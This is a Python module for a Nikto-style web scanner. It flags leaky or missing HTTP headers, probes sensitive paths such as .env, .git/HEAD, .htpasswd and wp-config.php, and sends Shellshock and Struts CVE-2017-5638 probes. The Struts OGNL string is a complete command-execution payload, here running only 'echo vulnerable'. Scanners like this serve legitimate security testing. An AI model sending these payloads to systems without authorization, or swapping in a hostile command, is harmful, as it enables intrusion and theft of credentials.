#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
from urllib.parse import urlparse
from core.logger import log_info, log_success, log_warning, log_error, log_debug

class NiktoStyleScanner:
    def __init__(self, target, verbose=False):
        self.target = target.rstrip('/')
        self.verbose = verbose
        self.vulnerabilities = []
        self.server_info = {}

    def check_headers(self):
        """Check HTTP headers for security issues"""
        try:
            resp = requests.get(self.target, timeout=10, allow_redirects=False)
            headers = resp.headers
            
            checks = {
                "Server": "Server header exposes version information",
                "X-Powered-By": "X-Powered-By header exposes technology",
                "X-AspNet-Version": "X-AspNet-Version header exposes ASP.NET version",
                "X-AspNetMvc-Version": "X-AspNetMvc-Version header exposes MVC version",
                "X-Generator": "X-Generator header exposes CMS/generator information",
                "X-Pingback": "X-Pingback header exposes XML-RPC endpoint",
                "X-Drupal-Cache": "X-Drupal-Cache header exposes Drupal cache info",
                "X-Drupal-Dynamic-Cache": "X-Drupal-Dynamic-Cache header exposes Drupal cache info",
                "X-Varnish": "X-Varnish header exposes Varnish cache info",
                "X-Cache": "X-Cache header exposes cache info",
                "X-Cache-Hits": "X-Cache-Hits header exposes cache info",
                "X-Server": "X-Server header exposes server info"
            }
            
            for header, warning in checks.items():
                if header in headers:
                    self.vulnerabilities.append({
                        "type": "Info Disclosure",
                        "severity": "Low",
                        "header": header,
                        "value": headers[header],
                        "message": warning
                    })
                    log_warning(f"⚠️ {header}: {headers[header]} ({warning})")
            
            # Check security headers
            security_checks = {
                "X-Frame-Options": "Missing X-Frame-Options (Clickjacking risk)",
                "X-Content-Type-Options": "Missing X-Content-Type-Options (MIME sniffing risk)",
                "Strict-Transport-Security": "Missing HSTS (SSL downgrade risk)",
                "Content-Security-Policy": "Missing CSP (XSS risk)",
                "Referrer-Policy": "Missing Referrer-Policy (referrer leakage risk)",
                "X-XSS-Protection": "Missing X-XSS-Protection (XSS risk)"
            }
            
            for header, warning in security_checks.items():
                if header not in headers:
                    self.vulnerabilities.append({
                        "type": "Security Header Missing",
                        "severity": "Medium",
                        "header": header,
                        "message": warning
                    })
                    log_warning(f"⚠️ Missing: {header} ({warning})")
        except Exception as e:
            log_error(f"Header check error: {e}")

    def check_common_paths(self):
        """Check for common sensitive paths"""
        paths = [
            "/robots.txt", "/sitemap.xml", "/.env", "/.git/HEAD", "/wp-admin",
            "/admin", "/login", "/phpinfo.php", "/info.php", "/php.ini",
            "/.htaccess", "/.htpasswd", "/backup.sql", "/backup.zip",
            "/config.php", "/wp-config.php", "/.env.local", "/.env.backup",
            "/debug.log", "/error.log", "/logs/", "/tmp/", "/temp/"
        ]
        
        for path in paths:
            url = f"{self.target}{path}"
            try:
                resp = requests.get(url, timeout=5, allow_redirects=False)
                if resp.status_code == 200:
                    self.vulnerabilities.append({
                        "type": "Sensitive File Exposure",
                        "severity": "High",
                        "path": path,
                        "status": resp.status_code,
                        "url": url
                    })
                    log_success(f"🔥 Found sensitive path: {path}")
                elif self.verbose and resp.status_code != 404:
                    log_debug(f"Path {path} -> {resp.status_code}")
            except:
                pass

    def check_common_cves(self):
        """Check for common CVEs"""
        # Simplified CVE checks
        cve_checks = [
            {
                "name": "CVE-2014-6271 (Shellshock)",
                "path": "/cgi-bin/test",
                "headers": {"User-Agent": "() { :; }; echo vulnerable"},
                "check": lambda r: "vulnerable" in r.text
            },
            {
                "name": "CVE-2017-5638 (Struts RCE)",
                "path": "/struts2-showcase",
                "headers": {"Content-Type": "%{(#_=multipart/form-data).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo vulnerable').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"}
            }
        ]
        
        for cve in cve_checks:
            try:
                url = f"{self.target}{cve['path']}"
                resp = requests.get(url, headers=cve.get('headers', {}), timeout=5)
                if cve['check'](resp):
                    self.vulnerabilities.append({
                        "type": "CVE",
                        "severity": "Critical",
                        "cve": cve['name'],
                        "path": cve['path']
                    })
                    log_success(f"🔥 {cve['name']} detected!")
            except:
                pass

    def run(self):
        log_info(f"Starting Nikto-style scan on: {self.target}")
        
        self.check_headers()
        self.check_common_paths()
        self.check_common_cves()
        
        log_success(f"Scan completed. Found {len(self.vulnerabilities)} issues.")
        return {
            "target": self.target,
            "scan_type": "nikto_style",
            "total_issues": len(self.vulnerabilities),
            "vulnerabilities": self.vulnerabilities
        }
